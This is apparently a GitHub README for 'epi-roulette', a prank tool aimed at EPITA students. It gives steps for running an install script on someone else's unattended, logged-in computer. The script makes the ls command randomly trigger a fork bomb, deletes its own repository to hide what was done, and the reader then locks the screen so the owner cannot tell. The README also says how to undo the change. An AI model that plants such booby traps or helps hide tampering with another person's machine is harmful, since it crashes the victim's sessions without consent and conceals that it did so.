# epi-roulette
A russian roulette for those who don't i3lock at EPITA
Alias a russian roulette to the ls using a fork bomb

## When to operate the epi-roulette
Let's say you see a PC logged in... *whithout* someone on it...
Well that's **THE** moment to operate !

## How to operate
1. Open a terminal
2. Clone the repo
```
$ ./epi-roulette/install.sh
```
3. Launch the script
Done!
(It even delete the repo, so you'll be safe)
Just i3lock the PC so the person can't tell

## How to remove the changes
Let's just say...you did it on your machine
To remove the changes : just go to your config file and remove the line where you see the ""RANDOM"" 
Your config file would be in *~/afs/.confs/(bashrc|zshrc)*
(Except if you changed your shell to another one than zsh or bash)

## Responsabilities
I am **NOT** responsible for any damage done on your friend's PCs
Just make sure you are friend (and I hope you are still friends after this)

### How to change the Config file path
Just modify the CONFIG_PATH variable in the config
